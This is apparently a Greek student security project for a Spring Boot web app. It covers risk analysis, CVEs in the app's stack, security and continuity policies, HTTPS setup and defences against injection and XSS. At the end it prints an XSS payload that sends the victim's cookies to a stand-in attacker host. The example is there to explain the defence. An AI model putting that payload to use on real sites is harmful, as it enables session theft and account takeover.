Τελική εργασία Ασφάλειας Πληροφοριακών Συστημάτων 2023-2024

Επιμέλεια: Αρμενάκης Ηλίας p20024
	      Μόσχος Χρήστος p16188

https://github.com/yixiatros/ergasia_omadas_5
(To repository απο δικιά μας εργασία μαθήματος που χρησιμοποιήσαμε)

Μελέτη ασφάλειας ΠΣ. Σε αυτό το στάδιο θα πραγματοποιήσετε μία σύντομη μελέτη ασφάλειας ΠΣ, η οποία θα περιλαμβάνει: (α) Ανάλυση επικινδυνότητας και (β) Σχέδιο Πολιτικής Ασφάλειας. (Σημείωση: αυτό το βήμα αποτελεί επέκταση της 1ης άσκησης)


 
Περιγραφή Συστήματος
Υπηρεσίες
H εφαρμογή CodeTask παρέχει τις παρακάτω on-line υπηρεσίες:
Εγγραφή χρηστών: Παρέχεται η δυνατότητα εγγραφής από χρήστες οι οποίοι επιθυμούν να λάβουν τις υπηρεσίες της εφαρμογής σαν χρήστες, clients και σαν χρήστες developers μέσω web form. Οι χρήστες δηλώνουν όνομα/username, κωδικό πρόσβασης/password, email και επιλέγουν αν θα κάνουν την εγγραφή ως clients ή developers.


  Δημιουργία αγγελιών: Όλοι οι χρήστες θα μπορούν να δημιουργήσουν αγγελία για ένα έργο/task για το οποίο θα περιγράφουν τι θέλουν να πραγματοποιηθεί (σε περίπτωση που είναι clients) στην περίπτωση που είναι πελάτες σε μορφή developers μπορούν να αναλάβουν τις αντίστοιχες αγγελίες.


Δημιουργία προσφοράς: Οι χρήστες τύπου clients έχουν την δυνατότητα να ορίσουν ένα ποσό προσφοράς για το έργο που επιθυμούν να υλοποιηθεί καθώς και οι developers να κάνουν bidding στην προσφορά του client ώστε να έχουν ανταγωνιστική τιμή στο έργο.




Αρχιτεκτονική
Η εφαρμογή έχει την εξής αρχιτεκτονική:
Οι τεχνολογίες υλοποίησης της παραπάνω υπηρεσίας που χρησιμοποιήθηκαν:
 
●     Λειτουργικό Σύστημα: Windows 10 pro 22H2 / Debian 11 / Fedora 38 / Sonoma 14.1
●     Εξυπηρετητής Ιστού: Apache Tomcat 10.1.11
●     Εξυπηρετητής εφαρμογής: java jdk 17.0.8.1
●     Εξυπηρετητής βάσης δεδομένων: MySQL v. 8.0.34
●     Πλαίσιο υλοποίησης (framework): Spring Boot v3.1.2 Thymeleaf
●     Πρωτόκολλο ασφαλείας SSL/TLS: SSL/TLS: TLS v1.2, Openssl v 3.0.11
●     Κλειδί εξυπηρετητή: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA


Δημιουργία μοντέλου αγαθών (asset model)











Αντιστοίχιση υπηρεσιών και υπολογιστικών συστημάτων
Εγγραφή χρηστών -> εξυπηρετείται απο το DB server, API server, web server.
Δημιουργία αγγελιών -> εξυπηρετείται απο το DB server, API server, web server.
Δημιουργία προσφοράς->εξυπηρετείται απο το DB server, API server, web server.








(α)


Ανάλυση επικινδυνότητας

Αποτίμηση συνεπειών ή επιπτώσεων ασφάλεια (impact assessment)











Αποτίμηση απειλών (threat assessment)







Αποτίμηση αδυναμιών (vulnerability assessment)
Για τον API server μας που είναι υλοποιημένο σε spring boot, έχουμε το εξής CVE για την κατάσταση ευπάθειας του framework απο την NIST
 https://nvd.nist.gov/vuln/detail/CVE-2023-38286
 https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI
 H ευπάθεια χαρακτηρίζεται HIGH βαθμού 7.5

 *Για αυτόν τον λόγο προτάθηκε και η αναβάθμιση σε v3.1.2 λόγω της ευπάθειας σε έκδοση v3.1.0

 Το Thymeleaf μέχρι την έκδοση 3.1.1.RELEASE, όπως χρησιμοποιείται στο spring-boot-admin (επίσης γνωστό ως Spring Boot Admin) μέχρι την έκδοση 3.1.1 και σε άλλα προϊόντα, επιτρέπει την παράκαμψη του αμμοδιάκτυλου μέσω προσεκτικά διαμορφωμένου HTML. Αυτό ενδέχεται να είναι σημαντικό για SSTI (Server Side Template Injection) και εκτέλεση κώδικα στο spring-boot-admin, εάν ο MailNotifier είναι ενεργοποιημένος και υπάρχει πρόσβαση εγγραφής στις μεταβλητές περιβάλλοντος μέσω του περιβάλλοντος χρήστη.

 Σε επίπεδο λειτουργικού συστήματος δεν βλέπουμε κάποια ευπάθεια για την έκδοση μας



Για τον database server μας χρησιμοποιούμε MySQL v8.0.34
 https://nvd.nist.gov/vuln/detail/CVE-2023-22114
 Ο βαθμός ευπάθειας είναι MEDIUM 4.9
 https://www.oracle.com/security-alerts/cpuoct2023.html
 Ευπάθεια στο προϊόν του MySQL Server της Oracle MySQL (συστατικό: InnoDB). Οι υποστηριζόμενες εκδόσεις που επηρεάζονται είναι οι 8.0.34 και προηγούμενες και η 8.1.0. Μια ευάλωτη αδυναμία επιτρέπει σε έναν χρήστη με υψηλά προνόμια και πρόσβαση στο δίκτυο μέσω πολλαπλών πρωτοκόλλων να διακινδυνεύσει το MySQL Server. Επιτυχημένες επιθέσεις αυτής της ευπάθειας μπορούν να οδηγήσουν σε μη εξουσιοδοτημένη ικανότητα προκαλέσει "hang" ή συχνές επαναλαμβανόμενες πτώσεις (πλήρης άρνησης υπηρεσίας) του MySQL Server. CVSS 3.1 Βαθμολογία Βάσης 4.9 (επιπτώσεις στη διαθεσιμότητα). Διάνυσμα CVSS: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).

 Για το λειτουργικό σύστημα, Fedora 28 βρήκαμε
 https://nvd.nist.gov/vuln/detail/CVE-2018-1111 σε βαθμό HIGH 7.5
 Τα πακέτα DHCP στα Red Hat Enterprise Linux 6 και 7, Fedora 28 και προηγούμενες εκδόσεις είναι ευάλωτα σε ένα ελάττωμα εντολών εντοπισμού στο σενάριο ενσωμάτωσης του NetworkManager που περιλαμβάνεται στον πελάτη DHCP. Ένα κακόβουλο διακομιστή DHCP ή ένας επιτιθέμενος στο τοπικό δίκτυο που μπορεί να παραποιήσει απαντήσεις DHCP, θα μπορούσε να χρησιμοποιήσει αυτό το ελάττωμα για να εκτελέσει αυθαίρετες εντολές με δικαιώματα ρίζας σε συστήματα που χρησιμοποιούν το NetworkManager και έχουν ρυθμιστεί να λαμβάνουν τη διαμόρφωση του δικτύου χρησιμοποιώντας το πρωτόκολλο DHCP.



Για τον web server μας χρησιμοποιούμε Tomcat 10.1.11 βλέπουμε ότι υπάρχει μια ευπάθεια MEDIUM βαθμού 5.3 για τις εκδόσεις απο 9.0.0 εως 11.0.0
 https://nvd.nist.gov/vuln/detail/CVE-2023-45648
 https://cwe.mitre.org/data/definitions/20.html
 Ευπάθεια στην Επικύρωση Εισόδου(Input Validation) στο Apache Tomcat. Ο Tomcat από την έκδοση 11.0.0-M1 μέχρι την 11.0.0-M11, από την 10.1.0-M1 μέχρι την 10.1.13, από την 9.0.0-M1 μέχρι την 9.0.81 και από την 8.5.0 μέχρι την 8.5.93 δεν ανέλυσε σωστά τις κεφαλίδες HTTP trailer. Μια ειδικά διαμορφωμένη, άκυρη κεφαλίδα trailer θα μπορούσε να προκαλέσει τον Tomcat να θεωρήσει ένα αίτημα ως πολλαπλά αιτήματα, με το ενδεχόμενο της request smuggling όταν βρίσκεται πίσω από έναν αντίστροφο διακομιστή. Συστήνεται στους χρήστες να αναβαθμίσουν στην έκδοση 11.0.0-M12 και μεταγενέστερες, 10.1.14 και μεταγενέστερες, 9.0.81 και μεταγενέστερες ή 8.5.94 και μεταγενέστερες, οι οποίες διορθώνουν το πρόβλημα.

 Για το λειτουργικό σύστημα, Debian 11 έχουμε σε HIGH επίπεδο
 https://nvd.nist.gov/vuln/detail/CVE-2021-41583
 Η εφαρμογή vpn-user-portal (επίσης γνωστή ως eduVPN ή Let's Connect!) πριν από την έκδοση 2.3.14, όπως είναι συσκευασμένη για Debian 10, Debian 11, και Fedora, επιτρέπει σε απομακρυσμένους πιστοποιημένους χρήστες να αποκτήσουν πρόσβαση στο filesystem του λειτουργικού συστήματος λόγω της αλληλεπίδρασης των κωδικών QR με ένα exec που χρησιμοποιεί την επιλογή -r. Αυτό μπορεί να χρησιμοποιηθεί για την απόκτηση επιπλέον πρόσβασης VPN.



Για το λειτουργικό του admin έχουμε το εξής MEDIUM threat 6.5 CVE
 https://nvd.nist.gov/vuln/detail/CVE-2023-42861
 https://cwe.mitre.org/data/definitions/732.html
 Επιλύθηκε μια λογική έκδοση με βελτιωμένη διαχείριση κατάστασης. Αυτό το πρόβλημα διορθώνεται στο macOS Sonoma 14.1. Ένας επιτιθέμενος με γνώση των διαπιστευτηρίων ενός κανονικού χρήστη μπορεί να ξεκλειδώσει την κλειδωμένη οθόνη ενός άλλου κανονικού χρήστη στον ίδιο Mac.












Αποτίμηση κινδύνων (risk assessment)
        Μη Εξουσιοδοτημένη Πρόσβαση (Unauthorized Access):
Αυτή η απειλή περιλαμβάνει προσπάθειες πρόσβασης σε ένα πληροφοριακό σύστημα χωρίς την επιτρεπτή άδεια. Οι επιτιθέμενοι μπορεί να προσπαθήσουν να κλέψουν ευαίσθητες πληροφορίες, να εκτελέσουν κακόβουλο λογισμικό ή να παρακολουθήσουν τις δραστηριότητες του συστήματος χωρίς άδεια.
 
     Επίθεση από Ransomware:
Οι επιθέσεις από ransomware συνήθως συνίστανται στην εγκατάσταση ενός κακόβουλου λογισμικού στο σύστημα, το οποίο κρυπτογραφεί τα δεδομένα του χρήστη. Οι επιτιθέμενοι απαιτούν στη συνέχεια λύτρα για την αποκρυπτογράφηση των δεδομένων.
 
        Web Defacement:
Σε μια επίθεση web defacement, οι επιτιθέμενοι αλλοιώνουν το περιεχόμενο μιας ιστοσελίδας. Αυτό μπορεί να συμβεί με το να αντικατασταθεί η αρχική σελίδα με μια δική τους, πολλές φορές με σκοπό να διαφημίσουν τις ιδέες τους, να προκαλέσουν αναστάτωση ή να αποπροσανατολίσουν τους χρήστες.
 
 Code Injection:
Η εισαγωγή κώδικα από τρίτους, γνωστή και ως code injection, συμβαίνει όταν επιτιθέμενοι εισάγουν κακόβουλο κώδικα σε μια εφαρμογή ή ιστοσελίδα. Αυτό μπορεί να οδηγήσει σε εκτέλεση μη εξουσιοδοτημένων ενεργειών, όπως πρόσβαση σε προσωπικά δεδομένα ή διακίνηση κακόβουλου κώδικα.
 
  Denial of Service (DoS):
Στις επιθέσεις DoS, οι επιτιθέμενοι επιδιώκουν να καταστήσουν το πληροφοριακό σύστημα μη διαθέσιμο για νόμιμους χρήστες, πλοηγώντας το σε κατάσταση υπερφόρτωσης. Αυτό μπορεί να γίνει με διάφορους τρόπους, όπως επανειλημμένες αιτήσεις από μια πολλαπλότητα συσκευών ή με αξιοποίηση ευπαθειών στο λογισμικό.
(β)

ΓΕΝΙΚΗ ΠΟΛΙΤΙΚΗ ΑΣΦΑΛΕΙΑΣ
Ο οργανισμός αναγνωρίζει την αναγκαιότητα διασφάλισης των πληροφοριακών αγαθών τα οποία βρίσκονται στην κατοχή ή υπό τον έλεγχό του καθώς και την υποχρέωση συμμόρφωσης με το Ελληνικό και Ευρωπαϊκό νομικό και κανονιστικό πλαίσιο. 
Η Πολιτική Ασφάλειας αποτελεί το πλαίσιο για την προστασία των δεδομένων που διαχειρίζεται ο οργανισμός, παρέχοντας καθοδήγηση σε σχέση με τον τρόπο οργάνωσης και επεξεργασίας των πληροφοριών. Η Πολιτική Ασφάλειας αποτελείται από σύνολο κανόνων που καθορίζουν τον τρόπο με τον οποίο ο οργανισμός διαχειρίζεται και προστατεύει τους Πληροφοριακούς της Πόρους (Information Assets). Οι κανόνες αυτοί προσδιορίζουν τον ρόλο κάθε εμπλεκόμενου μέσα στον οργανισμό, τις αρμοδιότητες, τις ευθύνες και τα καθήκοντά του.
Ο οργανισμός οφείλει να λαμβάνει όλα τα αναγκαία διοικητικά, τεχνικά, και οργανωτικά μέτρα για την επαρκή προστασία των πληροφοριακών του πόρων από τους διάφορους κινδύνους που τα απειλούν. Ως οργανισμός κατασκευής ιστοσελίδων βασικούς στρατηγικός στόχος ορίζεται η ικανοποίηση των πελατων και η επίτευξη του καλύτερου δυνατου αποτελέσματος με τους δεδομένους πόρους καθώς και η επίτευξη ενος ευνοϊκού περιβάλλοντος εργασίας,η εξελιξη των κεφαλαίων της εταιρείας(χρηματικών και υλικών). 
Η ανώτατη διοίκηση έχει πλήρη ευθύνη για ό,τι αναγράφεται στην πολιτικά ασφάλειας καθώς και στις πράξεις, δραστηριοτητες και αποτελέσματα του οργανισμού.Ο Υπεύθυνος Ασφάλειας Πληροφοριών έχει την ευθύνη για τον έλεγχο και την παρακολούθηση των πολιτικών και διαδικασιών που σχετίζονται με την Ασφάλεια Πληροφοριών και την ανάληψη των απαραίτητων πρωτοβουλιών για την εξάλειψη όλων εκείνων των παραγόντων που μπορούν να θέσουν σε κίνδυνο τη διαθεσιμότητα, ακεραιότητα και εμπιστευτικότητα των πληροφοριών του οργανισμού.
Το σύνολο των υπαλλήλων του οργανισμού και των συνεργατών της με πρόσβαση σε πληροφορίες και πληροφοριακά συστήματα της εταιρείας, έχει την ευθύνη της τήρησης των κανόνων της εφαρμοζόμενης  Πολιτικής Ασφάλειας Πληροφοριών.

Ο Υπεύθυνος Πολιτικής Ασφάλειας, με βασικές αρμοδιότητες τον έλεγχο και την κατάλληλη ενημέρωση της Πολιτικής Ασφάλειας.
Ο Υπεύθυνος Ασφάλειας Δικτύων και Πληροφοριακών Συστημάτων, με βασικές αρμοδιότητες τον έλεγχο της τήρησης όσων ορίζονται για την ασφάλεια δικτύων και συστημάτων στην Πολιτική.
Ο Υπεύθυνος Αντιμετώπισης Περιστατικών Ασφάλειας, με βασικές αρμοδιότητες το συντονισμό των αρμοδίων για την αντιμετώπιση περιστατικών ασφάλειας.
Η Ομάδα Ανάκαμψης από Καταστροφές, με βασικές αρμοδιότητες την ανάκαμψη των συστημάτων και δικτύων μετά από φυσικές ή άλλες καταστροφές που έχουν προκαλέσει διακοπή λειτουργιών ή καταστροφή εξοπλισμού και πληροφοριών
Ο Χρήστης Συστήματος, με βασικές αρμοδιότητες την ορθή χρήση των συστημάτων με βάση τα όσα ορίζονται από την Πολιτική, την αποφυγή ενεργειών που πιθανώς θα βλάψουν την ασφάλεια των συστημάτων και πληροφοριών και την αναφορά πιθανών περιστατικών ασφάλειας.
Ο Ιδιοκτητης-Διαχειριστης Πληροφοριακων πορων με βασικές αρμοδιότητες τον καθορισμό των απειλών, των αδυναμιών και της κρισιμότητας του πληροφοριακού πόρου που είναι υπεύθυνος και τον έλεγχο της εφαρμογής των κατάλληλων μέτρων ασφάλειας για αυτόν τον πληροφοριακό πόρο
 
ΠΟΛΙΤΙΚΗ ΕΙΔΙΚΟΥ ΣΚΟΠΟΥ
Πολιτική Προστασίας Internet και Email. Περιλαμβάνει ζητήματα όπως την αποδεκτή χρήση των παραπάνω συστημάτων, τον περιορισμό της πιθανότητας εισβολής από αυτά τα συστήματα, την απαγόρευση χρήσης τους για μη επιτρεπτούς σκοπούς κτλ.
Πολιτική Φυσικής Ασφάλειας. Περιλαμβάνει ζητήματα όπως την εκκένωση κτιρίων σε περίπτωση ανάγκης, τον έλεγχο της φυσικής πρόσβασης σε κτίρια, εγκαταστάσεις, δωμάτια με κρίσιμο εξοπλισμό ή πληροφορία κτλ.
Πολιτική Ασφάλειας Δικτύου. Περιλαμβάνει ζητήματα όπως τον καθορισμό περιμέτρου δικτύου, τη διάκριση ζωνών εντός του δικτύου με διαφορετικά επίπεδα ασφάλειας, τη χρήση συστημάτων ασφάλειας δικτύου όπως firewall, Intrusion Detection System (IDS) κτλ
Πολιτική Προστασίας από Ιούς. Περιλαμβάνει ζητήματα όπως τη χρήση συστημάτων anti-virus, τη διαχείριση αυτών των συστημάτων, την καθημερινή ενημέρωσή τους και χρήση τους κτλ.
 
ΣΧΕΔΙΟ ΕΠΙΧΕΙΡΗΣΙΑΚΗΣ ΣΥΝΕΧΕΙΑΣ
Στόχοι του Σχεδίου Επιχειρησιακής Συνέχειας:
●        Διατήρηση της συνέχισης των βασικών λειτουργιών της επιχείρησης πληροφορικής σε περίπτωση αντιμετώπισης απρόβλεπτων καταστάσεων.
●        Ελαχιστοποίηση της επίδρασης των κρίσεων στην επιχείρηση και στους πελάτες της.
Διαδικασίες και διατάξεις που περιλαμβάνει το Σχέδιο Επιχειρησιακής Συνέχειας:
Ανάλυση κινδύνων και καταγραφή ευπαθειών:
●        Ανάλυση των κινδύνων που μπορούν να επηρεάσουν την επιχείρηση, όπως φυσικές καταστροφές, κυβερνοεπιθέσεις και ανθρώπινο λάθος.
●        Καταγραφή των ευπαθειών της επιχείρησης στον τομέα της ασφάλειας των δεδομένων, των υποδομών και των εφαρμογών.
Καθορισμός κρίσιμων λειτουργικών αναγκών:
●        Καθορισμός των κρίσιμων λειτουργικών αναγκών της επιχείρησης, όπως η πρόσβαση σε σημαντικά δεδομένα, η επικοινωνία με τους πελάτες και η διατήρηση της λειτουργικότητας των κρίσιμων εφαρμογών.
Διαδικασίες αντιμετώπισης κρίσεων:
●        Καθορισμός των διαδικασιών αντιμετώπισης κρίσεων, όπως η ανάκτηση των δεδομένων, η αποκατάσταση της υποδομής και η ενημέρωση των πελατών και των εργαζομένων.
Δοκιμασίες και αναθεώρηση:
●        Δοκιμή των διαδικασιών αντιμετώπισης κρίσεων σε τακτική βάση και αναθεώρηση του Σχεδίου Επιχειρησιακής Συνέχειας για να διασφαλιστεί η επίτευξη των στόχων του σε περιπτώσεις κρίσεων.
Εκπαίδευση και ενημέρωση των εργαζομένων:
●        Εκπαίδευση των εργαζομένων στις διαδικασίες αντιμετώπισης κρίσεων και ενημέρωσή τους για το Σχέδιο Επιχειρησιακής Συνέχειας.

Πιθανά σενάρια καταστροφής που μπορεί να αντιμετωπίσει η επιχείρηση:
1      	Φυσική καταστροφή: μπορεί να προκληθεί από φυσικά φαινόμενα, όπως πλημμύρες, καταιγίδες, σεισμούς, πυρκαγιές και τυφώνες. Σε αυτήν την περίπτωση, η επιχείρηση πρέπει να είναι έτοιμη να αντιμετωπίσει την απώλεια των κτιρίων, των εξοπλισμών, των δεδομένων και την αντιμετώπιση τραυματισμών ή απώλεια ζωών και ανθρώπινων ζωών.
 
2      	Κυβερνοεπίθεση: μια επιθετική ενέργεια από κυβερνοεπιθέτες μπορεί να προκαλέσει τη διακοπή της λειτουργίας του δικτύου, της ιστοσελίδας ή της εφαρμογής της επιχείρησης, καθώς και την κλοπή ή την απώλεια δεδομένων. Η επιχείρηση πρέπει να έχει μια στρατηγική αντιμετώπισης των κυβερνοεπιθέσεων, καθώς και να έχει στοχευμένα μέτρα ασφαλείας για να προλάβει τέτοιου είδους επιθέσεις.
 
3      	Απώλεια εργαζομένων: αν ένας σημαντικός αριθμός εργαζομένων υποστεί τραυματισμό ή απώλεια λόγω ασθένειας ή άλλων αιτίων, η επιχείρηση θα πρέπει να βρει τρόπους για να συνεχίσει να λειτουργεί και να διατηρήσει το επίπεδο των υπηρεσιών της. Αυτό μπορεί να γίνει με την πρόσληψη νέων εργαζομένων, την εκπαίδευση τους και τη χρήση τεχνολογικών λύσεων για να βοηθήσει στην εξυπηρέτηση των πελατών.
 
4      	Οικονομική κρίση: η αδυναμία της επιχείρησης να ανταποκριθεί στις οικονομικές απαιτήσεις μπορεί να προκαλέσει την καταστροφή της. Αυτό μπορεί να συμβεί λόγω της μείωσης της ζήτησης για τα προϊόντα ή τις υπηρεσίες της επιχείρησης, της αύξησης των τιμών των πρώτων υλών, της αύξησης του ανταγωνισμού ή της αποτυχίας να ακολουθήσει τις τεχνολογικές εξελίξεις. Η επιχείρηση θα πρέπει να έχει ένα σχέδιο επιχειρηματικής συνέχειας που θα τη βοηθήσει να επιβιώσει από μια οικονομική κρίση.
 
5      	Ανθρώπινο λάθος: ένα λάθος από τους εργαζόμενους μπορεί να έχει σοβαρές συνέπειες για την επιχείρηση, όπως απώλεια πελατών, καταστροφή φήμης και επιπτώσεις στα οικονομικά της. Η επιχείρηση θα πρέπει να έχει ένα σχέδιο για τη διαχείριση ανθρωπίνων λαθών, συμπεριλαμβανομένης της εκπαίδευσης των εργαζομένων, της αντιμετώπισης των προβλημάτων και της πρόληψης μελλοντικών λαθών.
 
 
 
 

 
ΣΧΕΔΙΟ ΑΝΑΚΑΜΨΗΣ ΣΥΣΤΗΜΑΤΩΝ
 
Διαχείριση της συνέχειας των υπηρεσιών πληροφορικής:δεδομένου ότι οι υπηρεσίες που παρέχονται αποτελούν εν γένει υπηρεσίες πληροφορικής, η ανάκαμψη των IT υπηρεσιών και ο τρόπος με τον οποίο διασφαλίζεται η λειτουργία τους όταν ενεργοποιηθεί το σχέδιο ανάκαμψης είναι πρώτιστης σημασίας. Για το λόγο αυτό η εταιρία έχει προβλέψει μια σειρά από συνθήκες προκειμένου να επιτύχει τη μέγιστη αποτελεσματικότητα της διαχείρισης της επιχειρησιακής συνέχειας στο κομμάτι της ανάκαμψης των υπηρεσιών πληροφορικής. Παρακάτω παρουσιάζονται οι τρόποι με τους οποίους εξασφαλίζεται η αποτελεσματική διαχείρισης της επιχειρησιακής συνέχειας των υπηρεσιών πληροφορικής:

a. Αυτοματισμός ανακατεύθυνσης των εφαρμογών:
Η εταιρία συνεργάζεται με προμηθευτές παροχής εφαρμογών πληροφορικής οι οποίοι υποστηρίζουν πλήρως την επανεκκίνηση των εφαρμογών για τη διευκόλυνση είτε της ανάκαμψης από καταστροφή σε άλλο μηχανογραφικό κέντρο είτε για την συνεχή διαθεσιμότητα της εφαρμογής.
b. Διασφάλιση της προστασίας των δεδομένων:
Για την προστασία των δεδομένων όπως και γενικότερα για όλα τα ζητήματα ασφαλείας υπάρχει αρμόδια διεύθυνση ασφάλειας ορισμένη από τον οργανισμό η οποία εφαρμόζει πλαίσιο ασφαλείας και διαδικασίες για όλες τις λειτουργίες πληροφορικής που αφορούν όλο τον οργανισμό διασφαλίζοντας έτσι την προστασία των δεδομένων.
c. Διαχείριση χωρητικότητας της Giga-bit τάξης του δικτύου:
Οι προμηθευτές τηλεπικοινωνιακών υποδομών παρέχουν τις απαιτούμενες τάξεις μεγέθους του δικτύου ανάλογα με τις απαιτήσεις των εφαρμογών ο οργανισμός διασφαλίζει αυτή την υπηρεσία στους πελάτες της παρέχοντας την με προκαθορισμένο επίπεδο SLA λαμβάνοντας υπόψη τα RTO’s και RPO’s που ορίζονται στο BIA του εκάστοτε πελάτη.
e. Προμήθεια εγκαταστάσεων μηχανογραφικού κέντρου:
Η εταιρεία έχει στην κατοχή της εναλλακτικό μηχανογραφικό κέντρο κατ’ εικόνα του αντίστοιχου παραγωγικού της, τα οποία, επιπλέον, μηχανογραφικά κέντρα είναι σε σύνδεση Active – Active παρέχοντας στις υπηρεσίες πληροφορικής πολύ χαμηλό επίπεδο RTO (1) και RPO (0) για μηδενική
απώλεια δεδομένων από το σημείο αστοχίας και μετά.
f.Διαχείριση της ασφάλειας των υποδομών και των εφαρμογών πληροφορικής:
Για τη διαχείριση της ασφάλειας των υποδομών και των εφαρμογών όπως και γενικότερα για όλα τα ζητήματα ασφαλείας υπάρχει αρμόδια διεύθυνση ασφάλειας ορισμένη από τον οργανισμό
που εφαρμόζει πλαίσιο ασφαλείας και διαδικασίες για όλες τις λειτουργίες πληροφορικής που αφορούν όλο τον οργανισμό
 
g.Διαχείριση των ασκήσεων ετοιμότητας:
Η εταιρεία πραγματοποιεί προγραμματισμένες ασκήσεις ανάκαμψης από καταστροφή σε ετήσια βάση που βασίζονται σε ενημερωμένα σχέδια ανάκαμψης (DRP) τα οποία ενημερώνονται με το πέρας κάθε άσκησης ως προεργασία για την επόμενη προγραμματισμένη άσκηση την επόμενη χρονιά.
h. Διαχείριση των παραμετροποιήσεων και των αλλαγών:
Ο συνδυασμός των διαδικασιών διαχείρισης και υποστήριξης του λογισμικού που απαιτούνται για να εξασφαλιστεί ότι οι αλλαγές στις υποδομές, τις εφαρμογές και τα δεδομένα του μηχανογραφικού κέντρου είναι συνεπείς μεταξύ του κύριου και του εναλλακτικού επιβάλλεται τόσο από τις διαδικασίες
της ίδιας της εταιρίας όσο και από τα ISO με τα οποία έχει πιστοποιηθεί.
i. Διαχείριση εξάρτησης:
Η εταιρία χρησιμοποιεί λογισμικό και ακολουθεί διαδικασίες υποστήριξης που επιτρέπουν, με σαφήνεια και αποτελεσματικότητα, στα αρμόδια τμήμα της πληροφορικής να προσδιορίσουν ποιες εφαρμογές και δεδομένα της παραγωγής μπορούν να συμμετέχουν στις ασκήσεις με αξιοπιστία μαζί ή να λειτουργούν ταυτόχρονα τόσο κατά τη διάρκεια της κανονικής λειτουργίας όσο και των λειτουργιών ανάκτησης.
j. Διασφάλιση Ανάκαμψης:
Γίνεται χρήση αυτοματισμών του λογισμικού που παραμετροποιούν και διαχειρίζονται σύνολα εικονικών διακομιστών (virtual servers) προκειμένου να ενορχηστρωθεί το σχέδιο της άσκησης ανάκαμψης από καταστροφή.
k. Διαχείριση συνεχούς βελτίωσης:
Η εταιρία παρακολουθεί ένα συγκεκριμένο σύνολο από KPI's που χρησιμοποιούνται για την ποσοτική μέτρηση της προόδου του προγράμματος επιχειρησιακής συνέχειας των υπηρεσιών πληροφορικής τα οποία αποστέλλει και στις εταιρείες του οργανισμού στις οποίες παρέχει υπηρεσίες πληροφορικής. Είναι μια υποχρέωση που απορρέει τόσο από ως κεντρική οδηγία του οργανισμού αλλά και από τα ISO με το οποία έχει πιστοποιηθεί. Από την άλλη όμως η εταιρία δεν παρακολουθεί δείκτες KRI's χάσμα το οποίο καλείται να καλύψει προκειμένου να βελτιώσει την αποτελεσματικότητα και την διαδικασία αξιολόγησης της διαχείρισης επιχειρησιακής συνέχειας.


Να υλοποιήσετε κρυπτογράφηση ssl στον server. Η υπηρεσία σας να λειτουργεί μόνο σε https με τη χρήση πιστοποιητικού στον web server. (Σημείωση: αυτό το βήμα βασίζεται στην 3η άσκηση)

Για την έκδοση πιστοποιητικού χρησιμοποιήσαμε keytool που είναι προεγκατεστημένη με τον JDK την Java και εκδώσαμε το certificate






Αλλάξαμε τα configuration της εφαρμογής μας να μπορεί να δέχεται https requests στην πόρτα 8443


Στην συνέχεια προσθέσαμε το πιστοποιητικό στον περιηγητή μας και το βάλαμε να είναι exception σαν trusted source, βέβαια δεν καταφέραμε να βγάλουμε το μήνυμα με την προειδοποίηση.






Να υλοποιήσετε ένα μηχανισμό αυθεντικοποίησης (user authentication), πχ. username,password, one-time password, certificate based κτλ. και ελέγχου πρόσβασης (authorization), π.χ. LDAP-based, identity management, certificate based, group-based, role-based κτλ. (Σημείωση: αυτό το βήμα θα αποτελεί επέκταση της 4ης άσκησης)

Για τον μηχανισμό αυθεντικοποίησης, χρησιμοποιήσαμε username, password  και ο κάθε χρήστης έχει τις δικές του λειτουργίες και “ελευθερίες” ανάλογα τον ρόλο του, client, developer, admin. 





Όπως βλέπουμε και παρακάτω η κίνηση στην εφαρμογή περιορίζεται ανάλογα με τον ρόλο, ο οποίος αρχικοποιείτε στην αρχή στην βάση. Η χρήση wildcards για τα domain και η χρήση authorization request



Για τη λήψη δεδομένων εισόδου από τους χρήστες της εφαρμογής, να χρησιμοποιήσετε προγραμματιστικές συναρτήσεις, ανάλογα με τη γλώσσα προγραμματισμού που έχετε επιλέξει, οι οποίες ενα επιβάλουν input filtering και validation (δείτε ενδεικτικά: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html), ώστε να μην είναι εύκολο για έναν κακόβουλο χρήστη να υλοποιήσει επιθέσεις τύπου sql injection και XSS.


Cross-Site Scripting (XSS) Attack:
Περιγραφή: Η επίθεση Cross-Site Scripting (XSS) είναι μια επίθεση κατά της ασφάλειας των ιστοσελίδων όπου ο επιτιθέμενος ενθαρρύνει τον browser του θύματος να εκτελέσει κακόβουλο κώδικα JavaScript. Αυτό μπορεί να επιτευχθεί εισάγοντας κώδικα JavaScript σε είσοδο που αναμένεται να εμφανιστεί από την ιστοσελίδα.
Πώς Λειτουργεί: Ο επιτιθέμενος ενσωματώνει κακόβουλο κώδικα σε είσοδο που αποστέλλεται στον server και στη συνέχεια εμφανίζεται χωρίς να έχει επαρκή φιλτράρισμα. Όταν ο browser του θύματος αναπαράγει τη σελίδα, ο κακόβουλος κώδικας εκτελείται.
Λύσεις:
Εξόρθωση (Output Encoding): Κωδικοποίηση των εισόδων πριν εμφανιστούν στη σελίδα. Χρησιμοποίησε ασφαλείς μεθόδους εμφάνισης δεδομένων όπως &lt; αντί για <.
Χρήση Content Security Policy (CSP): Εφαρμογή πολιτικής ασφαλείας περιεχομένου για περιορισμό των πηγών εκτέλεσης JavaScript.
Περιορισμός Πρόσβασης στα Cookies: Χρησιμοποίησε το HttpOnly attribute στα cookies για να αποτρέψεις την πρόσβαση από JavaScript.

Email Address Validation

Περιορισμός συμβόλων κατα την είσοδο χαρακτήρων, π.χ στο mail του χρήστη προς εγγραφή, να μην μπορεί να ξεφύγει με απαγορευμένους χαρακτήρες




Thymeleaf th:text & th:utext για την αντιμετώπιση XSS. Η χρήση των συγκεκριμένων tags εμποδίζει την είσοδο χαρακτήρων κατα την προβολή κειμένων. Σαν τελευταίο μέτρο μπορεί να χρησιμοποιηθεί και το th:raw, αλλά προτείνεται να αποφεύγεται 


 
Επίσης προσθέσαμε όριο χαρακτήρων στην εφαρμογή στα html tags, για αποφυγή μεγάλων payloads, για πιο sophisticated character escapes, παράδειγμα.

<script>alert('XSS');</script>





Για την αποφυγή session stealing, χρησιμοποιήσαμε session tokens. Παράδειγμα 
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
Είναι payload που στοχεύει στα session του χρήστη, όπως login tokens που αποθηκεύονται στο μηχάνημα του χρήστη και με αυτά ο αντίπαλος, μπορεί να πάρει μη εξουσιοδοτημένη πρόσβαση στον λογαριασμό του χρήστη



